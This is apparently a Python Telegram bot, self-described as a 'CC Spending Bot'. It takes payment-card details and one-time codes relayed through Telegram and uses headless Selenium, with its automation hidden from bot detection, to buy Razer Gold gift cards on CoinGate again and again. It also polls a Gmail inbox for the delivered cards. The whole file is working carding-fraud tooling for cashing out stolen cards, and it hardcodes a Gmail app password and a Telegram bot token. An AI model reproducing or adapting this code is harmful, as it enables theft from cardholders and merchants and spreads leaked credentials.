import asyncio
import re
import time
import logging
import sys
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes
import imaplib
import email
from email.header import decode_header
import threading
from dataclasses import dataclass
from typing import Optional
from datetime import datetime
import base64
from io import BytesIO

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)

@dataclass
class CardInfo:
    cardholder_name: str = ""
    card_number: str = ""
    card_type: str = ""
    expiry: str = ""
    cvc: str = ""
    billing_address: str = ""
    time: str = ""

@dataclass
class OTPInfo:
    card_number: str = ""
    otp: str = ""
    time: str = ""

class CoinGateAutomation:
    def __init__(self, telegram_bot=None, chat_id=None):
        self.driver = None
        self.current_card = None
        self.otp_info = None
        self.transaction_count = 0
        self.running = False
        self.telegram_bot = telegram_bot
        self.chat_id = chat_id
        self.setup_driver()
        
    def setup_driver(self):
        """Setup Chrome driver for cloud environment"""
        chrome_options = Options()
        
        # Cloud-optimized settings
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        try:
            # For cloud environment
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            logging.info("Chrome driver initialized successfully")
        except Exception as e:
            logging.error(f"Chrome setup failed: {e}")
            # Fallback to ChromeDriver manager
            try:
                from webdriver_manager.chrome import ChromeDriverManager
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
                logging.info("Chrome driver initialized with webdriver_manager")
            except Exception as e2:
                logging.error(f"All Chrome setups failed: {e2}")
                raise

    async def send_screenshot(self, caption: str):
        """Take screenshot and send to Telegram"""
        try:
            if not self.telegram_bot or not self.chat_id:
                return
                
            # Take screenshot
            screenshot = self.driver.get_screenshot_as_png()
            
            # Send to Telegram
            await self.telegram_bot.send_photo(
                chat_id=self.chat_id,
                photo=screenshot,
                caption=caption
            )
            logging.info(f"Screenshot sent: {caption}")
        except Exception as e:
            logging.error(f"Failed to send screenshot: {e}")

    def extract_card_info(self, message: str) -> Optional[CardInfo]:
        """Extract card information from Telegram message"""
        try:
            card_info = CardInfo()
            
            patterns = {
                'cardholder_name': r"👤 Cardholder Name:\s*(.+)",
                'card_number': r"💳 Card Number:\s*(.+)",
                'card_type': r"🏦 Card Type:\s*(.+)",
                'expiry': r"📅 Expiry:\s*(.+)",
                'cvc': r"🔐 CVC:\s*(.+)",
                'billing_address': r"🏠 Billing Address:\s*(.+)",
                'time': r"⏰ Time:\s*(.+)"
            }
            
            for field, pattern in patterns.items():
                match = re.search(pattern, message)
                if match:
                    setattr(card_info, field, match.group(1).strip())
            
            # Validate required fields
            if card_info.card_number and card_info.cvc:
                return card_info
            return None
        except Exception as e:
            logging.error(f"Error extracting card info: {e}")
            return None
    
    def extract_otp_info(self, message: str) -> Optional[OTPInfo]:
        """Extract OTP information from Telegram message"""
        try:
            otp_info = OTPInfo()
            
            card_match = re.search(r"💳 Card Number:\s*(.+)", message)
            otp_match = re.search(r"🔢 OTP:\s*(.+)", message)
            time_match = re.search(r"⏰ Time:\s*(.+)", message)
            
            if card_match and otp_match:
                otp_info.card_number = card_match.group(1).strip()
                otp_info.otp = otp_match.group(1).strip()
                otp_info.time = time_match.group(1).strip() if time_match else ""
                return otp_info
            return None
        except Exception as e:
            logging.error(f"Error extracting OTP info: {e}")
            return None
    
    async def navigate_to_giftcard_page(self):
        """Navigate to the CoinGate gift card page"""
        try:
            self.driver.get("https://coingate.com/gift-cards/razer-gold-rixty")
            WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            logging.info("Successfully navigated to gift card page")
            await self.send_screenshot("🎯 Landed on CoinGate Gift Card Page")
            return True
        except Exception as e:
            logging.error(f"Failed to navigate to gift card page: {e}")
            return False
    
    async def select_region_and_value(self, card_type: str, is_first_transaction: bool = True):
        """Select region and value based on card type"""
        try:
            # Select Value
            if card_type.lower() == "mastercard" and is_first_transaction:
                target_value = "500"
            else:
                target_value = "100"
            
            value_selectors = [
                "//select[@id='value']",
                "//select[contains(@name, 'value')]",
                "//div[contains(@class, 'value')]//select",
                "//select[contains(@class, 'value')]"
            ]
            
            for selector in value_selectors:
                try:
                    value_dropdown = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    value_dropdown.click()
                    # Select value option
                    value_option = self.driver.find_element(By.XPATH, f"{selector}/option[contains(@value, '{target_value}') or contains(text(), '{target_value}')]")
                    value_option.click()
                    break
                except:
                    continue
            
            logging.info(f"Selected ${target_value} USD value")
            await self.send_screenshot(f"💰 Selected ${target_value} USD Value")
            return True
        except Exception as e:
            logging.error(f"Failed to select region and value: {e}")
            return False
    
    async def click_buy_now(self):
        """Click the Buy Now button"""
        try:
            buy_now_selectors = [
                "//button[contains(text(), 'Buy Now')]",
                "//a[contains(text(), 'Buy Now')]",
                "//input[@value='Buy Now']",
                "//button[@type='submit' and contains(., 'Buy')]"
            ]
            
            for selector in buy_now_selectors:
                try:
                    buy_button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    buy_button.click()
                    logging.info("Clicked Buy Now button")
                    await self.send_screenshot("🛒 Clicked Buy Now Button")
                    return True
                except:
                    continue
            
            return False
        except Exception as e:
            logging.error(f"Failed to click Buy Now: {e}")
            return False
    
    async def fill_payment_details(self, card_info: CardInfo):
        """Fill payment details on the payment page"""
        try:
            # Wait for payment page to load
            WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Fill email
            email_selectors = [
                "//input[@type='email']",
                "//input[contains(@name, 'email')]",
                "//input[@id='email']"
            ]
            
            for selector in email_selectors:
                try:
                    email_field = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    email_field.clear()
                    email_field.send_keys("mail.info.us1@gmail.com")
                    break
                except:
                    continue
            
            # Select payment card method
            payment_method_selectors = [
                "//input[@value='card']",
                "//input[contains(@name, 'payment') and contains(@value, 'card')]",
                "//label[contains(., 'Payment Card')]//input",
                "//div[contains(., 'Payment Card')]//input"
            ]
            
            for selector in payment_method_selectors:
                try:
                    payment_method = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    payment_method.click()
                    break
                except:
                    continue
            
            # Click purchase button
            purchase_selectors = [
                "//button[contains(text(), 'Purchase')]",
                "//input[@value='Purchase']",
                "//button[@type='submit' and contains(., 'Purchase')]"
            ]
            
            for selector in purchase_selectors:
                try:
                    purchase_button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    purchase_button.click()
                    break
                except:
                    continue
            
            await self.send_screenshot("📝 Filled Email & Selected Payment Method")
            
            # Handle checkboxes and confirm
            await self.handle_confirmation()
            
            # Fill card details
            await self.fill_card_details(card_info)
            
            # Fill billing information
            await self.fill_billing_info(card_info)
            
            # Click place order
            await self.click_place_order()
            
            return True
        except Exception as e:
            logging.error(f"Failed to fill payment details: {e}")
            return False
    
    async def handle_confirmation(self):
        """Handle confirmation checkboxes and buttons"""
        try:
            # Wait for confirmation page
            time.sleep(3)
            
            # Find and click checkboxes
            checkboxes = self.driver.find_elements(By.XPATH, "//input[@type='checkbox']")
            for checkbox in checkboxes:
                try:
                    if not checkbox.is_selected():
                        checkbox.click()
                except:
                    continue
            
            # Find and click confirm button
            confirm_selectors = [
                "//button[contains(text(), 'Confirm')]",
                "//input[@value='Confirm']",
                "//button[@type='submit' and contains(., 'Confirm')]"
            ]
            
            for selector in confirm_selectors:
                try:
                    confirm_button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    confirm_button.click()
                    break
                except:
                    continue
            
            logging.info("Handled confirmation step")
            await self.send_screenshot("✅ Confirmed Terms & Conditions")
        except Exception as e:
            logging.error(f"Error in confirmation handling: {e}")
    
    async def fill_card_details(self, card_info: CardInfo):
        """Fill card details on payment form"""
        try:
            # Map card details to likely field names
            field_mapping = {
                'cardholder': ['cardholder', 'card_name', 'name_on_card'],
                'cardnumber': ['cardnumber', 'card_number', 'number'],
                'expiry': ['expiry', 'exp_date', 'expiration'],
                'cvv': ['cvv', 'cvc', 'security_code']
            }
            
            for field_type, possible_names in field_mapping.items():
                for name in possible_names:
                    selectors = [
                        f"//input[contains(@name, '{name}')]",
                        f"//input[contains(@id, '{name}')]",
                        f"//input[contains(@placeholder, '{name}')]"
                    ]
                    
                    for selector in selectors:
                        try:
                            field = self.driver.find_element(By.XPATH, selector)
                            if field_type == 'cardholder':
                                field.send_keys(card_info.cardholder_name)
                            elif field_type == 'cardnumber':
                                field.send_keys(card_info.card_number.replace(" ", ""))
                            elif field_type == 'expiry':
                                # Format expiry date properly (MM/YY)
                                expiry = card_info.expiry.replace('/', '').strip()
                                if len(expiry) == 4:
                                    formatted_expiry = f"{expiry[:2]}/{expiry[2:]}"
                                else:
                                    formatted_expiry = expiry
                                field.send_keys(formatted_expiry)
                            elif field_type == 'cvv':
                                field.send_keys(card_info.cvc)
                            break
                        except:
                            continue
            
            logging.info("Filled card details")
            await self.send_screenshot("💳 Filled Card Details")
        except Exception as e:
            logging.error(f"Error filling card details: {e}")
    
    def extract_country_from_address(self, billing_address: str) -> str:
        """Extract country from billing address with better parsing"""
        try:
            if not billing_address:
                return "United States"
            
            country_mappings = {
                'us': 'United States', 'usa': 'United States', 'united states': 'United States',
                'uk': 'United Kingdom', 'u.k.': 'United Kingdom', 'united kingdom': 'United Kingdom',
                'ca': 'Canada', 'canada': 'Canada', 'au': 'Australia', 'australia': 'Australia'
            }
            
            address_parts = re.split(r'[,\n|]', billing_address)
            
            for part in reversed(address_parts):
                part_clean = part.strip().lower()
                if part_clean in country_mappings:
                    return country_mappings[part_clean]
                
                for short_name, full_name in country_mappings.items():
                    if short_name in part_clean or full_name.lower() in part_clean:
                        return full_name
            
            address_lower = billing_address.lower()
            if 'united states' in address_lower or ' usa' in address_lower or ', us' in address_lower:
                return 'United States'
            elif 'united kingdom' in address_lower or ' uk' in address_lower:
                return 'United Kingdom'
            elif 'canada' in address_lower or ', ca' in address_lower:
                return 'Canada'
            
            return "United States"
            
        except Exception as e:
            logging.error(f"Error extracting country from address: {e}")
            return "United States"
    
    async def fill_billing_info(self, card_info: CardInfo):
        """Fill billing information"""
        try:
            # Fill email again if needed
            email_fields = self.driver.find_elements(By.XPATH, "//input[@type='email']")
            for field in email_fields:
                try:
                    field.clear()
                    field.send_keys("mail.info.us1@gmail.com")
                except:
                    continue
            
            # Extract country from billing address
            country = self.extract_country_from_address(card_info.billing_address)
            
            # Fill country
            country_selectors = [
                "//select[contains(@name, 'country')]",
                "//select[contains(@id, 'country')]",
                "//input[contains(@name, 'country')]",
                "//select[contains(@data-name, 'country')]"
            ]
            
            for selector in country_selectors:
                try:
                    country_field = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    
                    if country_field.tag_name == "select":
                        try:
                            option = country_field.find_element(By.XPATH, f".//option[contains(text(), '{country}')]")
                            option.click()
                            break
                        except:
                            options = country_field.find_elements(By.TAG_NAME, "option")
                            for option in options:
                                if country.lower() in option.text.lower():
                                    option.click()
                                    break
                            break
                    else:
                        country_field.clear()
                        country_field.send_keys(country)
                        break
                except:
                    continue
            
            # Fill name
            if card_info.cardholder_name:
                names = card_info.cardholder_name.split(' ', 1)
                first_name = names[0]
                last_name = names[1] if len(names) > 1 else ""
                
                # First name
                first_name_selectors = [
                    "//input[contains(@name, 'first')]",
                    "//input[contains(@id, 'first')]",
                    "//input[contains(@placeholder, 'First')]",
                    "//input[@name='firstname']"
                ]
                
                for selector in first_name_selectors:
                    try:
                        field = self.driver.find_element(By.XPATH, selector)
                        field.send_keys(first_name)
                        break
                    except:
                        continue
                
                # Last name
                last_name_selectors = [
                    "//input[contains(@name, 'last')]",
                    "//input[contains(@id, 'last')]",
                    "//input[contains(@placeholder, 'Last')]",
                    "//input[@name='lastname']"
                ]
                
                for selector in last_name_selectors:
                    try:
                        field = self.driver.find_element(By.XPATH, selector)
                        field.send_keys(last_name)
                        break
                    except:
                        continue
            
            logging.info(f"Filled billing information - Country: {country}")
            await self.send_screenshot(f"🏠 Filled Billing Info - Country: {country}")
        except Exception as e:
            logging.error(f"Error filling billing info: {e}")
    
    async def click_place_order(self):
        """Click place order button"""
        try:
            place_order_selectors = [
                "//button[contains(text(), 'Place Order')]",
                "//input[@value='Place Order']",
                "//button[contains(., 'Order') and @type='submit']",
                "//button[contains(., 'Complete Purchase')]"
            ]
            
            for selector in place_order_selectors:
                try:
                    place_order_btn = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    place_order_btn.click()
                    logging.info("Clicked Place Order")
                    await self.send_screenshot("🚀 Clicked Place Order Button")
                    return True
                except:
                    continue
            return False
        except Exception as e:
            logging.error(f"Error clicking place order: {e}")
            return False
    
    async def handle_otp_page(self):
        """Handle OTP verification page if it appears"""
        try:
            time.sleep(5)
            
            otp_selectors = [
                "//input[contains(@name, 'otp')]",
                "//input[contains(@id, 'otp')]",
                "//input[contains(@placeholder, 'OTP')]",
                "//input[contains(@type, 'password') and contains(@maxlength, '6')]",
                "//input[contains(@name, 'code')]",
                "//input[contains(@id, 'code')]",
                "//input[contains(@placeholder, 'Code')]",
                "//input[contains(@placeholder, 'Verification')]"
            ]
            
            otp_field = None
            for selector in otp_selectors:
                try:
                    otp_field = WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, selector))
                    )
                    break
                except:
                    continue
            
            if otp_field and self.otp_info:
                otp_field.clear()
                otp_field.send_keys(self.otp_info.otp)
                logging.info("Filled OTP/Verification Code")
                await self.send_screenshot("🔐 Filled OTP Code")
                
                button_selectors = [
                    "//button[contains(text(), 'Confirm')]",
                    "//button[contains(text(), 'Submit')]",
                    "//button[contains(text(), 'Verify')]",
                    "//input[@type='submit']",
                    "//button[@type='submit']"
                ]
                
                for selector in button_selectors:
                    try:
                        button = WebDriverWait(self.driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, selector))
                        )
                        button.click()
                        logging.info("Clicked OTP confirmation button")
                        await self.send_screenshot("✅ Submitted OTP")
                        return True
                    except:
                        continue
                
                return True
            return False
        except Exception as e:
            logging.error(f"Error handling OTP page: {e}")
            return False
    
    async def check_transaction_status(self):
        """Check and report transaction status"""
        try:
            time.sleep(10)
            
            page_source = self.driver.page_source.lower()
            
            status = "Unknown"
            
            if any(word in page_source for word in ['success', 'confirmed', 'completed', 'thank you', 'approved']):
                status = "SUCCESS"
            elif any(word in page_source for word in ['fail', 'error', 'declined', 'rejected', 'invalid']):
                status = "FAILED"
            elif any(word in page_source for word in ['pending', 'processing', 'waiting']):
                status = "PENDING"
            
            logging.info(f"Transaction Status: {status}")
            
            # Send final result screenshot
            await self.send_screenshot(f"📊 FINAL RESULT: {status}")
            
            return status
        except Exception as e:
            logging.error(f"Error checking transaction status: {e}")
            return "ERROR"
    
    async def process_card(self, card_info: CardInfo):
        """Main method to process a card through the entire flow"""
        try:
            logging.info(f"Starting transaction for card: {card_info.card_number[-4:]}")
            
            if not await self.navigate_to_giftcard_page():
                return False
            
            is_mastercard = "mastercard" in card_info.card_type.lower()
            is_first_transaction = self.transaction_count == 0
            
            if not await self.select_region_and_value(card_info.card_type, is_first_transaction):
                return False
            
            if not await self.click_buy_now():
                return False
            
            if not await self.fill_payment_details(card_info):
                return False
            
            otp_handled = await self.handle_otp_page()
            if otp_handled:
                logging.info("OTP page was handled")
            
            status = await self.check_transaction_status()
            
            self.transaction_count += 1
            logging.info(f"Transaction completed. Status: {status}. Count: {self.transaction_count}")
            
            return status == "SUCCESS"
        except Exception as e:
            logging.error(f"Error processing card: {e}")
            await self.send_screenshot(f"❌ ERROR: {str(e)}")
            return False
    
    async def continuous_loop(self, card_info: CardInfo):
        """Continuous transaction loop for a card"""
        self.running = True
        
        while self.running:
            try:
                success = await self.process_card(card_info)
                
                if not success:
                    logging.info("Stopping continuous loop due to failure")
                    break
                
                is_mastercard = "mastercard" in card_info.card_type.lower()
                
                if is_mastercard and self.transaction_count > 0 and self.otp_info:
                    logging.info("Stopping mastercard loop due to OTP requirement")
                    break
                
                time.sleep(10)
                
            except Exception as e:
                logging.error(f"Error in continuous loop: {e}")
                break
        
        self.running = False

class EmailChecker:
    def __init__(self):
        self.email = "mail.info.us1@gmail.com"
        self.password = "hsrfarffbbppocqv"
    
    def check_delivery_status(self):
        """Check email for delivery status"""
        try:
            mail = imaplib.IMAP4_SSL("imap.gmail.com")
            mail.login(self.email, self.password)
            mail.select("inbox")
            
            status, messages = mail.search(None, 'UNSEEN')
            email_ids = messages[0].split()
            
            for email_id in email_ids:
                status, msg_data = mail.fetch(email_id, "(RFC822)")
                email_body = msg_data[0][1]
                message = email.message_from_bytes(email_body)
                
                subject = decode_header(message["subject"])[0][0]
                if isinstance(subject, bytes):
                    subject = subject.decode()
                
                if any(keyword in subject.lower() for keyword in ['delivered', 'gift card', 'razer', 'coinbase', 'coingate']):
                    mail.store(email_id, '+FLAGS', '\\Seen')
                    return f"Delivery email found: {subject}"
            
            mail.close()
            mail.logout()
            return "No new delivery emails"
        except Exception as e:
            logging.error(f"Error checking email: {e}")
            return f"Email check error: {e}"

class TelegramBotHandler:
    def __init__(self):
        self.token = "8594532460:AAFiJ3-ip3xqcx394T8soMx8C2gscOqC7pA"
        self.application = Application.builder().token(self.token).build()
        self.automation = None
        self.email_checker = EmailChecker()
        self.current_card_thread = None
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle incoming Telegram messages"""
        try:
            message_text = update.message.text
            chat_id = update.effective_chat.id
            
            if "💳 New Card Added" in message_text:
                # Initialize automation with bot and chat_id
                self.automation = CoinGateAutomation(
                    telegram_bot=self.application.bot,
                    chat_id=chat_id
                )
                
                card_info = self.automation.extract_card_info(message_text)
                if card_info:
                    self.automation.current_card = card_info
                    self.automation.transaction_count = 0
                    self.automation.otp_info = None
                    
                    if self.current_card_thread and self.current_card_thread.is_alive():
                        self.automation.running = False
                        self.current_card_thread.join(timeout=5)
                    
                    # Start automation in separate thread
                    def run_loop():
                        asyncio.run(self.automation.continuous_loop(card_info))
                    
                    self.current_card_thread = threading.Thread(target=run_loop)
                    self.current_card_thread.daemon = True
                    self.current_card_thread.start()
                    
                    await update.message.reply_text(f"🤖 Card received. Starting automation for: {card_info.card_number[-4:]}")
                else:
                    await update.message.reply_text("❌ Failed to parse card information")
            
            elif "🔐 Card Verification OTP" in message_text:
                if self.automation:
                    otp_info = self.automation.extract_otp_info(message_text)
                    if otp_info:
                        self.automation.otp_info = otp_info
                        await update.message.reply_text(f"🔑 OTP received for card: {otp_info.card_number[-4:]}")
                    else:
                        await update.message.reply_text("❌ Failed to parse OTP information")
                else:
                    await update.message.reply_text("❌ No active automation session")
            
            elif message_text.lower() == "status":
                if self.automation:
                    status = "🟢 Running" if self.automation.running else "🔴 Stopped"
                    await update.message.reply_text(
                        f"🤖 Automation Status: {status}\n"
                        f"💳 Transactions: {self.automation.transaction_count}\n"
                        f"🔄 Current Card: {self.automation.current_card.card_number[-4:] if self.automation.current_card else 'None'}"
                    )
                else:
                    await update.message.reply_text("❌ No active automation session")
            
            elif message_text.lower() == "stop":
                if self.automation:
                    self.automation.running = False
                    await update.message.reply_text("🛑 Automation stopped")
                else:
                    await update.message.reply_text("❌ No active automation session")
            
            elif message_text.lower() == "check email":
                email_status = self.email_checker.check_delivery_status()
                await update.message.reply_text(f"📧 Email Status: {email_status}")
            
            elif message_text.lower() == "screenshot":
                if self.automation and self.automation.driver:
                    await self.automation.send_screenshot("📸 Manual Screenshot Request")
                else:
                    await update.message.reply_text("❌ No active automation session")
                
        except Exception as e:
            logging.error(f"Error handling Telegram message: {e}")
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    def start_bot(self):
        """Start the Telegram bot"""
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        logging.info("Starting Telegram bot on Render...")
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)

def main():
    """Main function to start the application"""
    logging.info("🤖 Starting CC Spending Bot on Render...")
    
    try:
        bot_handler = TelegramBotHandler()
        bot_handler.start_bot()
        
    except Exception as e:
        logging.error(f"❌ Application error: {e}")

if __name__ == "__main__":
    main()